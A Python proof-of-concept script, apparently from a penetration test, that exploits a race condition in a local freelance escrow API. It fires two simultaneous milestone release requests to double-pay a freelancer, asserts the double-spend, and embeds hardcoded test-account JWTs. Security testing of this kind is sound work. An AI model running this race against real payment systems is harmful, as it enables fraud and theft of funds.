"""
WSTG-BUSL-04: Concurrent escrow releases double-spend the same milestone.
Expected: two simultaneous release requests both return 200 and both affect balances.
"""
import io
import threading
import time

import requests

BASE = "http://localhost:3000"
CLIENT_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJpZCI6IjU2NjRiN2YxLWRjNTctNGFhYy1hM2YxLTJlYzU5ZDc5MTVmOSIsImVtYWlsIjoidGVz"
    "dGNsaWVudEBoaXJlZmxvdy5jb20iLCJyb2xlIjoiY2xpZW50Iiwid2FsbGV0QmFsYW5jZSI6IjEx"
    "MDAxMDEwMjE1Nzc3MyIsImlhdCI6MTc3NDk2MTAzNywiZXhwIjoxNzc1NTY1ODM3fQ."
    "3pECPDykXAOh8VbOb0q19EcgmwsQBYWnq28wfG8AZ0o"
)
FREELANCER_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJpZCI6IjNmY2ZiM2I0LTgzMzUtNGIxMy1iODEzLTNkNDI1YzNlY2Y3ZSIsImVtYWlsIjoidGVz"
    "dGZyZWVsYW5jZXJAaGlyZWZsb3cuY29tIiwicm9sZSI6ImZyZWVsYW5jZXIiLCJ3YWxsZXRCYWxh"
    "bmNlIjoiMTAwMDAwMDAwMDAxMzAyNzciLCJpYXQiOjE3NzQ5NjI3MjAsImV4cCI6MTc3NTU2NzUy"
    "MH0.6nRbolbwukW7iofKkQ4sr0Ky35ta41IMT1LJiHZeRp4"
)
FREELANCER_ID = "3fcfb3b4-8335-4b13-b813-3d425c3ecf7e"

stamp = str(int(time.time()))
contract = requests.post(f"{BASE}/api/contracts", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, json={
    "freelancer_id": FREELANCER_ID,
    "title": f"WSTG race {stamp}",
    "description": "race test",
    "amount": 100,
    "milestones": [{"title": "Race milestone", "amount": 100}],
}, timeout=10).json()

cid = contract["id"]
mid = contract["milestones"][0]["id"]

requests.post(f"{BASE}/api/payments/escrow/fund/{mid}", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, timeout=10).raise_for_status()
requests.post(
    f"{BASE}/api/contracts/{cid}/milestones/{mid}/submit",
    headers={"Authorization": f"Bearer {FREELANCER_TOKEN}"},
    files={"files": ("note.txt", io.BytesIO(b"hello"), "text/plain")},
    data={"message": "done"},
    timeout=10,
).raise_for_status()
requests.put(f"{BASE}/api/contracts/{cid}/milestones/{mid}/approve", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, timeout=10).raise_for_status()

before_client = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, timeout=10).json()
before_free = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {FREELANCER_TOKEN}",
}, timeout=10).json()

results = []


def fire(i):
    r = requests.post(f"{BASE}/api/payments/escrow/release/{mid}", headers={
        "Authorization": f"Bearer {CLIENT_TOKEN}",
    }, timeout=10)
    results.append((i, r.status_code, r.text[:120]))


threads = [threading.Thread(target=fire, args=(1,)), threading.Thread(target=fire, args=(2,))]
for thread in threads:
    thread.start()
for thread in threads:
    thread.join()

after_client = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, timeout=10).json()
after_free = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {FREELANCER_TOKEN}",
}, timeout=10).json()

print("Results:", results)
print("Client pending:", before_client["pending_balance"], "->", after_client["pending_balance"])
print("Freelancer balance:", before_free["balance"], "->", after_free["balance"])
assert sum(1 for _, status, _ in results if status == 200) == 2
assert int(before_client["pending_balance"]) - int(after_client["pending_balance"]) == 200
assert int(after_free["balance"]) - int(before_free["balance"]) == 180
print("\n[VULNERABLE] Two concurrent releases were processed for one milestone")
